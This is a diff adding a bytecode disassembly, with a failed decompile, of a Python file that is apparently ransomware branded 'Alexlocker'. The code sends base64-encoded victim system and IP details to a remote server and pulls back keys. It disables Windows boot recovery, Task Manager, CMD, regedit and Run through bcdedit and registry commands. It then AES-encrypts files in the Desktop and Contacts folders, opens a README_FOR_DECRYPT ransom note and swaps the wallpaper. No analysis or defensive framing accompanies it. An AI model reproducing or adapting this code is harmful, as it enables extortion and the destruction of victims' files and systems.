@@ -1,0 +1,379 @@
+
+# file test/179686.pyc
+# --- This code section failed: ---
+
+ L.   1         0  LOAD_CONST               0
+                2  LOAD_CONST               None
+                4  IMPORT_NAME              os
+                6  STORE_NAME               os
+                8  LOAD_CONST               0
+               10  LOAD_CONST               None
+               12  IMPORT_NAME              fnmatch
+               14  STORE_NAME               fnmatch
+               16  LOAD_CONST               0
+               18  LOAD_CONST               None
+               20  IMPORT_NAME              struct
+               22  STORE_NAME               struct
+               24  LOAD_CONST               0
+               26  LOAD_CONST               None
+               28  IMPORT_NAME              random
+               30  STORE_NAME               random
+               32  LOAD_CONST               0
+               34  LOAD_CONST               None
+               36  IMPORT_NAME              string
+               38  STORE_NAME               string
+               40  LOAD_CONST               0
+               42  LOAD_CONST               None
+               44  IMPORT_NAME              base64
+               46  STORE_NAME               base64
+               48  LOAD_CONST               0
+               50  LOAD_CONST               None
+               52  IMPORT_NAME              platform
+               54  STORE_NAME               platform
+               56  LOAD_CONST               0
+               58  LOAD_CONST               None
+               60  IMPORT_NAME              sys
+               62  STORE_NAME               sys
+               64  LOAD_CONST               0
+               66  LOAD_CONST               None
+               68  IMPORT_NAME              time
+               70  STORE_NAME               time
+               72  LOAD_CONST               0
+               74  LOAD_CONST               None
+               76  IMPORT_NAME              socket
+               78  STORE_NAME               socket
+               80  LOAD_CONST               0
+               82  LOAD_CONST               None
+               84  IMPORT_NAME              json
+               86  STORE_NAME               json
+               88  LOAD_CONST               0
+               90  LOAD_CONST               None
+               92  IMPORT_NAME              urllib
+               94  STORE_NAME               urllib
+               96  LOAD_CONST               0
+               98  LOAD_CONST               None
+              100  IMPORT_NAME              ctypes
+              102  STORE_NAME               ctypes
+              104  LOAD_CONST               0
+              106  LOAD_CONST               None
+              108  IMPORT_NAME              urllib2
+              110  STORE_NAME               urllib2
+
+ L.   2       112  LOAD_CONST               0
+              114  LOAD_CONST               None
+              116  IMPORT_NAME              SintaRegistery
+              118  STORE_NAME               SintaRegistery
+
+ L.   3       120  LOAD_CONST               0
+              122  LOAD_CONST               None
+              124  IMPORT_NAME              SintaChangeWallpaper
+              126  STORE_NAME               SintaChangeWallpaper
+
+ L.   4       128  LOAD_CONST               0
+              130  LOAD_CONST               ('Random',)
+              132  IMPORT_NAME              Crypto
+              134  IMPORT_FROM              Random
+              136  STORE_NAME               Random
+              138  POP_TOP          
+
+ L.   5       140  LOAD_CONST               0
+              142  LOAD_CONST               ('AES',)
+              144  IMPORT_NAME_ATTR         Crypto.Cipher
+              146  IMPORT_FROM              AES
+              148  STORE_NAME               AES
+              150  POP_TOP          
+
+ L.   6       152  LOAD_STR                 'Alexlocker'
+              154  STORE_NAME               rmsbrand
+
+ L.   7       156  LOAD_STR                 'ALex'
+              158  STORE_NAME               newextns
+
+ L.   8       160  LOAD_STR                 ' santi_I LOVE YOU__'
+              162  STORE_NAME               encfolder
+
+ L.   9       164  LOAD_STR                 '123jjsdei@cc.cc'
+              166  STORE_NAME               email_con
+
+ L.  10       168  LOAD_STR                 'ewr43r4wrw4d4r4r4r'
+              170  STORE_NAME               btc_address
+
+ L.  11       172  LOAD_NAME                os
+              174  LOAD_ATTR                path
+              176  LOAD_METHOD              expanduser
+              178  LOAD_STR                 '~'
+              180  CALL_METHOD_1         1  ''
+              182  STORE_NAME               userhome
+
+ L.  12       184  LOAD_STR                 'http://www.dobrebaseny.pl/js/lib/srv/'
+              186  STORE_NAME               my_server
+
+ L.  13       188  LOAD_STR                 'http://wallpaperrs.com/uploads/girls/thumbs/mood-ravishing-hd-wallpaper-142943312215.jpg'
+              190  STORE_NAME               wallpaper_link
+
+ L.  14       192  LOAD_NAME                base64
+              194  LOAD_METHOD              b64encode
+              196  LOAD_NAME                str
+              198  LOAD_NAME                platform
+              200  LOAD_METHOD              uname
+              202  CALL_METHOD_0         0  ''
+              204  CALL_FUNCTION_1       1  ''
+              206  CALL_METHOD_1         1  ''
+              208  STORE_NAME               victim_info
+
+ L.  15       210  LOAD_NAME                my_server
+              212  LOAD_STR                 'api.php?info='
+              214  BINARY_ADD       
+              216  LOAD_NAME                victim_info
+              218  BINARY_ADD       
+              220  LOAD_STR                 '&ip='
+              222  BINARY_ADD       
+              224  LOAD_NAME                base64
+              226  LOAD_METHOD              b64encode
+              228  LOAD_NAME                socket
+              230  LOAD_METHOD              gethostbyname
+              232  LOAD_NAME                socket
+              234  LOAD_METHOD              gethostname
+              236  CALL_METHOD_0         0  ''
+              238  CALL_METHOD_1         1  ''
+              240  CALL_METHOD_1         1  ''
+              242  BINARY_ADD       
+              244  STORE_NAME               configurl
+
+ L.  16       246  LOAD_CONST               None
+              248  STORE_NAME               glob_config
+
+ L.  17       250  SETUP_FINALLY       310  'to 310'
+
+ L.  18       252  LOAD_NAME                json
+              254  LOAD_METHOD              loads
+              256  LOAD_NAME                urllib
+              258  LOAD_METHOD              urlopen
+              260  LOAD_NAME                configurl
+              262  CALL_METHOD_1         1  ''
+              264  LOAD_METHOD              read
+              266  CALL_METHOD_0         0  ''
+              268  CALL_METHOD_1         1  ''
+              270  STORE_NAME               glob_config
+
+ L.  19       272  LOAD_NAME                set
+              274  LOAD_NAME                glob_config
+              276  LOAD_METHOD              keys
+              278  CALL_METHOD_0         0  ''
+              280  CALL_FUNCTION_1       1  ''
+              282  LOAD_NAME                set
+              284  BUILD_LIST_0          0 
+              286  LOAD_CONST               ('MRU_ID', 'MRU_UDP', 'MRU_PDP')
+              288  CALL_FINALLY        291  'to 291'
+              290  CALL_FUNCTION_1       1  ''
+              292  COMPARE_OP               !=
+          294_296  POP_JUMP_IF_FALSE   306  'to 306'
+
+ L.  20       298  LOAD_NAME                Exception
+              300  LOAD_STR                 '0x00001'
+              302  CALL_FUNCTION_1       1  ''
+              304  RAISE_VARARGS_1       1  'exception instance'
+            306_0  COME_FROM           294  '294'
+              306  POP_BLOCK        
+              308  JUMP_FORWARD        340  'to 340'
+            310_0  COME_FROM_FINALLY   250  '250'
+
+ L.  21       310  DUP_TOP          
+              312  LOAD_NAME                IOError
+          314_316  <121>               338  ''
+              318  POP_TOP          
+              320  POP_TOP          
+              322  POP_TOP          
+
+ L.  22       324  LOAD_NAME                time
+              326  LOAD_METHOD              sleep
+              328  LOAD_CONST               1
+              330  CALL_METHOD_1         1  ''
+              332  POP_TOP          
+              334  POP_EXCEPT       
+              336  JUMP_FORWARD        340  'to 340'
+              338  <48>             
+            340_0  COME_FROM           336  '336'
+            340_1  COME_FROM           308  '308'
+
+ L.  24       340  LOAD_NAME                glob_config
+              342  LOAD_STR                 'MRU_ID'
+              344  BINARY_SUBSCR    
+              346  STORE_NAME               victim_id
+
+ L.  25       348  LOAD_NAME                glob_config
+              350  LOAD_STR                 'MRU_UDP'
+              352  BINARY_SUBSCR    
+              354  STORE_NAME               victim_r
+
+ L.  26       356  LOAD_NAME                glob_config
+              358  LOAD_STR                 'MRU_PDP'
+              360  BINARY_SUBSCR    
+              362  STORE_NAME               victim_s
+
+ L.  27       364  SETUP_FINALLY       430  'to 430'
+
+ L.  28       366  LOAD_NAME                os
+              368  LOAD_METHOD              system
+              370  LOAD_STR                 'bcdedit /set {default} recoveryenabled No'
+              372  CALL_METHOD_1         1  ''
+              374  POP_TOP          
+
+ L.  29       376  LOAD_NAME                os
+              378  LOAD_METHOD              system
+              380  LOAD_STR                 'bcdedit /set {default} bootstatuspolicy ignoreallfailures'
+              382  CALL_METHOD_1         1  ''
+              384  POP_TOP          
+
+ L.  30       386  LOAD_NAME                os
+              388  LOAD_METHOD              system
+              390  LOAD_STR                 'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f'
+              392  CALL_METHOD_1         1  ''
+              394  POP_TOP          
+
+ L.  31       396  LOAD_NAME                os
+              398  LOAD_METHOD              system
+              400  LOAD_STR                 'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f'
+              402  CALL_METHOD_1         1  ''
+              404  POP_TOP          
+
+ L.  32       406  LOAD_NAME                os
+              408  LOAD_METHOD              system
+              410  LOAD_STR                 'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f'
+              412  CALL_METHOD_1         1  ''
+              414  POP_TOP          
+
+ L.  33       416  LOAD_NAME                os
+              418  LOAD_METHOD              system
+              420  LOAD_STR                 'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f'
+              422  CALL_METHOD_1         1  ''
+              424  POP_TOP          
+              426  POP_BLOCK        
+              428  JUMP_FORWARD        450  'to 450'
+            430_0  COME_FROM_FINALLY   364  '364'
+
+ L.  34       430  DUP_TOP          
+              432  LOAD_NAME                WindowsError
+          434_436  <121>               448  ''
+              438  POP_TOP          
+              440  POP_TOP          
+              442  POP_TOP          
+
+ L.  35       444  POP_EXCEPT       
+              446  JUMP_FORWARD        450  'to 450'
+              448  <48>             
+            450_0  COME_FROM           446  '446'
+            450_1  COME_FROM           428  '428'
+
+ L.  37       450  LOAD_CODE                <code_object setWallpaper>
+              452  LOAD_STR                 'setWallpaper'
+              454  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              456  STORE_NAME               setWallpaper
+
+ L.  47       458  LOAD_CODE                <code_object write_instruction>
+              460  LOAD_STR                 'write_instruction'
+              462  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              464  STORE_NAME               write_instruction
+
+ L.  57       466  LOAD_CODE                <code_object find_files>
+              468  LOAD_STR                 'find_files'
+              470  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              472  STORE_NAME               find_files
+
+ L.  70       474  LOAD_CODE                <code_object make_directory>
+              476  LOAD_STR                 'make_directory'
+              478  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              480  STORE_NAME               make_directory
+
+ L.  79       482  LOAD_CONST               6
+              484  LOAD_NAME                string
+              486  LOAD_ATTR                ascii_uppercase
+              488  LOAD_NAME                string
+              490  LOAD_ATTR                digits
+              492  BINARY_ADD       
+              494  BUILD_TUPLE_2         2 
+              496  LOAD_CODE                <code_object text_generator>
+              498  LOAD_STR                 'text_generator'
+              500  MAKE_FUNCTION_1          'default'
+              502  STORE_NAME               text_generator
+
+ L.  83       504  LOAD_CODE                <code_object generate_file>
+              506  LOAD_STR                 'generate_file'
+              508  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              510  STORE_NAME               generate_file
+
+ L.  93       512  LOAD_CONST               (None, 65536, 16)
+              514  LOAD_CODE                <code_object encrypt_file>
+              516  LOAD_STR                 'encrypt_file'
+              518  MAKE_FUNCTION_1          'default'
+              520  STORE_NAME               encrypt_file
+
+ L. 112       522  LOAD_NAME                userhome
+              524  LOAD_STR                 '\\Desktop\\'
+              526  BINARY_ADD       
+              528  LOAD_NAME                userhome
+              530  LOAD_STR                 '\\Contacts\\'
+              532  BINARY_ADD       
+              534  BUILD_TUPLE_2         2 
+              536  STORE_NAME               listdir
+
+ L. 113       538  LOAD_NAME                listdir
+              540  GET_ITER         
+              542  FOR_ITER            576  'to 576'
+              544  STORE_NAME               dir_
+
+ L. 114       546  LOAD_NAME                find_files
+              548  LOAD_NAME                dir_
+              550  CALL_FUNCTION_1       1  ''
+              552  GET_ITER         
+              554  FOR_ITER            572  'to 572'
+              556  STORE_NAME               filename
+
+ L. 115       558  LOAD_NAME                generate_file
+              560  LOAD_NAME                dir_
+              562  LOAD_NAME                filename
+              564  CALL_FUNCTION_2       2  ''
+              566  POP_TOP          
+          568_570  JUMP_BACK           554  'to 554'
+          572_574  JUMP_BACK           542  'to 542'
+
+ L. 120       576  LOAD_NAME                write_instruction
+              578  LOAD_NAME                userhome
+              580  LOAD_STR                 '\\Desktop\\'
+              582  BINARY_ADD       
+              584  LOAD_STR                 'txt'
+              586  CALL_FUNCTION_2       2  ''
+              588  POP_TOP          
+
+ L. 121       590  LOAD_NAME                os
+              592  LOAD_METHOD              startfile
+              594  LOAD_NAME                userhome
+              596  LOAD_STR                 '\\Desktop\\README_FOR_DECRYPT.txt'
+              598  BINARY_ADD       
+              600  CALL_METHOD_1         1  ''
+              602  POP_TOP          
+
+ L. 122       604  LOAD_NAME                setWallpaper
+              606  LOAD_NAME                wallpaper_link
+              608  CALL_FUNCTION_1       1  ''
+              610  POP_TOP          
+
+Parse error at or near `CALL_FINALLY' instruction at offset 288
+
+Instruction context:
+   
+ L.  19       272  LOAD_NAME                set
+                 274  LOAD_NAME                glob_config
+                 276  LOAD_METHOD              keys
+                 278  CALL_METHOD_0         0  ''
+                 280  CALL_FUNCTION_1       1  ''
+                 282  LOAD_NAME                set
+                 284  BUILD_LIST_0          0 
+                 286  LOAD_CONST               ('MRU_ID', 'MRU_UDP', 'MRU_PDP')
+->               288  CALL_FINALLY        291  'to 291'
+                 290  CALL_FUNCTION_1       1  ''
+                 292  COMPARE_OP               !=
+             294_296  POP_JUMP_IF_FALSE   306  'to 306'
+
+test/179686.pyc -- 
+# decompile failed
